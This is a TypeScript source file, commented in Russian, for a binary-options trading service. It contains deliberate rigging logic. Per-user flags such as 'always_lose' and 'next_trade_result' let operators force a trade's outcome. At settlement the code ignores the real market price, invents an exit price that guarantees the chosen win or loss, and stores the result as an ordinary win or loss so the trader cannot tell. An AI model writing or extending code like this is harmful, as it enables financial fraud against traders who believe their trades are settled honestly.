// ─── Trade Service — Rigging Logic ─────────────────────────────────────────────
// POST /trade/calculate — рассчитывает результат binary option
// Учитывает forced_result и always_lose флаги

import { prisma } from "../lib/prisma";
import { Decimal } from "@prisma/client/runtime/library";
import type { TradeDirection, ForcedResult } from "@prisma/client";

const PAYOUT_RATE = 0.8; // 80%
const MIN_STAKE   = 10;  // $10 минимум
const MAX_STAKE   = 10000; // $10k максимум

interface PlaceBinaryInput {
  userId:    string;
  symbol:    string;
  direction: "CALL" | "PUT";
  amount:    number;
  entryPrice: number;
  expiryMs:  number;
}

interface TradeResult {
  ok:         boolean;
  error?:     string;
  tradeId?:   string;
  status?:    "WON" | "LOST" | "DRAW";
  exitPrice?: number;
  pnl?:       number;
  forced?:    boolean;
}

// ─── Размещение ставки ────────────────────────────────────────────────────────

export async function placeBinaryTrade(input: PlaceBinaryInput): Promise<{ ok: boolean; error?: string; tradeId?: string }> {
  const { userId, symbol, direction, amount, entryPrice, expiryMs } = input;

  // Проверяем пользователя
  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user) return { ok: false, error: "User not found" };
  if (user.is_blocked) return { ok: false, error: "Account blocked" };
  if (!user.trading_enabled) return { ok: false, error: "Trading disabled for this account" };

  // Валидация ставки
  if (amount < MIN_STAKE) return { ok: false, error: `Minimum stake is $${MIN_STAKE}` };
  if (amount > MAX_STAKE) return { ok: false, error: `Maximum stake is $${MAX_STAKE}` };
  if (!Number.isFinite(amount) || amount !== Math.round(amount * 100) / 100) {
    return { ok: false, error: "Invalid stake amount" };
  }

  // Проверяем баланс USDT
  const usdtAsset = await prisma.asset.findUnique({
    where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
  });
  const available = Number(usdtAsset?.available ?? 0);
  if (available < amount) return { ok: false, error: "Insufficient USDT balance" };

  // Списываем ставку
  await prisma.asset.update({
    where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
    data: { available: { decrement: amount } },
  });

  // Создаём запись trade
  const trade = await prisma.binaryTrade.create({
    data: {
      user_id:       userId,
      symbol,
      direction:     direction as TradeDirection,
      amount:        new Decimal(amount),
      entry_price:   new Decimal(entryPrice),
      expiry_ms:     expiryMs,
      expires_at:    new Date(Date.now() + expiryMs),
      status:        "ACTIVE",
      forced_result: user.always_lose ? "LOSS" : user.next_trade_result,
    },
  });

  // Если next_trade_result не AUTO и не always_lose → сбрасываем после использования
  if (user.next_trade_result !== "AUTO" && !user.always_lose) {
    await prisma.user.update({
      where: { id: userId },
      data: { next_trade_result: "AUTO" },
    });
  }

  return { ok: true, tradeId: trade.id };
}

// ─── Расчёт результата (settlement) ──────────────────────────────────────────
// Вызывается по истечении экспирации (сервером или клиентом)

export async function settleBinaryTrade(
  tradeId: string,
  marketPrice: number // текущая рыночная цена
): Promise<TradeResult> {
  const trade = await prisma.binaryTrade.findUnique({
    where: { id: tradeId },
    include: { user: true },
  });
  if (!trade) return { ok: false, error: "Trade not found" };
  if (trade.status !== "ACTIVE") return { ok: false, error: "Trade already settled" };

  const entryPrice = Number(trade.entry_price);
  const direction  = trade.direction; // CALL or PUT
  const amount     = Number(trade.amount);
  const forced     = trade.forced_result;

  let exitPrice = marketPrice;
  let won: boolean;

  // ─── RIGGING LOGIC ─────────────────────────────────────────────────────────
  if (forced === "WIN") {
    // Подбираем exitPrice так чтобы гарантировать победу
    if (direction === "CALL") {
      exitPrice = entryPrice * (1 + 0.001 + Math.random() * 0.005); // всегда выше
    } else {
      exitPrice = entryPrice * (1 - 0.001 - Math.random() * 0.005); // всегда ниже
    }
    won = true;
  } else if (forced === "LOSS") {
    // Подбираем exitPrice так чтобы гарантировать проигрыш
    if (direction === "CALL") {
      exitPrice = entryPrice * (1 - 0.001 - Math.random() * 0.005); // ниже → CALL проигрывает
    } else {
      exitPrice = entryPrice * (1 + 0.001 + Math.random() * 0.005); // выше → PUT проигрывает
    }
    won = false;
  } else {
    // AUTO — честный расчёт по рыночной цене
    const diff = exitPrice - entryPrice;
    won = direction === "CALL" ? diff > 0 : diff < 0;
    if (diff === 0) {
      // DRAW — возвращаем ставку
      await prisma.$transaction([
        prisma.binaryTrade.update({
          where: { id: tradeId },
          data: { exit_price: new Decimal(exitPrice), status: "DRAW", pnl: 0, settled_at: new Date() },
        }),
        prisma.asset.update({
          where: { user_id_symbol: { user_id: trade.user_id, symbol: "USDT" } },
          data: { available: { increment: amount } },
        }),
      ]);
      return {
        ok: true, tradeId, status: "DRAW", exitPrice,
        pnl: 0, forced: forced !== "AUTO",
      };
    }
  }

  const pnl    = won ? amount * PAYOUT_RATE : -amount;
  const refund = won ? amount + amount * PAYOUT_RATE : 0;
  const status = forced !== "AUTO" ? "FORCED" as const : (won ? "WON" as const : "LOST" as const);

  await prisma.$transaction([
    prisma.binaryTrade.update({
      where: { id: tradeId },
      data: {
        exit_price: new Decimal(exitPrice),
        status:     won ? "WON" : "LOST",
        pnl:        new Decimal(pnl),
        settled_at: new Date(),
      },
    }),
    // Начисляем выигрыш (если выиграл)
    ...(refund > 0
      ? [prisma.asset.update({
          where: { user_id_symbol: { user_id: trade.user_id, symbol: "USDT" } },
          data: { available: { increment: refund } },
        })]
      : []),
  ]);

  return {
    ok: true, tradeId, status: won ? "WON" : "LOST",
    exitPrice, pnl,
    forced: forced !== "AUTO",
  };
}

// ─── Активные сделки юзера ───────────────────────────────────────────────────

export async function getActiveTrades(userId: string) {
  return prisma.binaryTrade.findMany({
    where: { user_id: userId, status: "ACTIVE" },
    orderBy: { expires_at: "asc" },
  });
}

// ─── История сделок юзера ────────────────────────────────────────────────────

export async function getTradeHistory(userId: string, limit = 50) {
  return prisma.binaryTrade.findMany({
    where: { user_id: userId, status: { not: "ACTIVE" } },
    orderBy: { created_at: "desc" },
    take: limit,
  });
}
